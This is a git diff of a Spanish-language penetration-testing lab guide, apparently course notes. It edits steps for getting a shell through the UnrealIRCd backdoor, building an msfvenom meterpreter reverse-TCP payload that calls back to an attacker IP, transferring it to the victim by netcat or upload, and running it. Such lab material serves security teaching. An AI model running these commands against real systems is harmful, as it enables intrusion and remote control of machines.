@@ -403,9 +403,6 @@ vncviewer <IP_VICTIMA>:5900
 
 ### Guía de comandos
 
-> [!IMPORTANT]
-> **Orden temporal:** Primero se genera el payload, luego se pone el handler a la escucha, después se transfiere el archivo a la víctima, y por último se ejecuta.
-
 ```bash
 # PASO 0 — Obtener shell inicial en la víctima (ej. con UnrealIRCd del Ejercicio 6)
 # msfconsole > use exploit/unix/irc/unreal_ircd_3281_backdoor > set RHOSTS <IP_VICTIMA> > exploit
@@ -414,19 +411,7 @@ vncviewer <IP_VICTIMA>:5900
 # PASO 1 — Generar payload Linux reverse shell con MSFVenom (en Kali)
 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP_ATACANTE> LPORT=4444 -f elf -o /tmp/payload.elf
 
-# PASO 2 — Configurar handler en Metasploit (en la MISMA terminal Kali, msfconsole)
-use exploit/multi/handler
-set payload linux/x86/meterpreter/reverse_tcp
-
-# Lanzar en background (-j) para poder usar nc después
-exploit -j
-
-# PASO 3 — En OTRA terminal de Kali, servir el payload con Netcat
-# (el handler ya está escuchando en el puerto 4444)
-nc -lvp 4445 < /tmp/payload.elf
-
-# PASO 4 — Desde la shell de la víctima, descargar el payload
-nc <IP_ATACANTE> 4445 > /tmp/payload.elf
+upload /tmp/payload.elf /tmp/payload.elf    
 
 # PASO 5 — Asignar permisos y ejecutar el payload (en la víctima)
 chmod +x /tmp/payload.elf
@@ -444,7 +429,8 @@ cat /etc/*release
 ```
 
 ![](attachments/{76217B7C-0EC9-4FC0-B541-5E3610524F24}.png)
-![](attachments/{8C2BC42A-7936-4244-AEE3-EEBF32E73977}.png)
+![](attachments/{1715C8D5-701B-49BD-AC33-80BC87453E4C}.png)
+
 
 
 
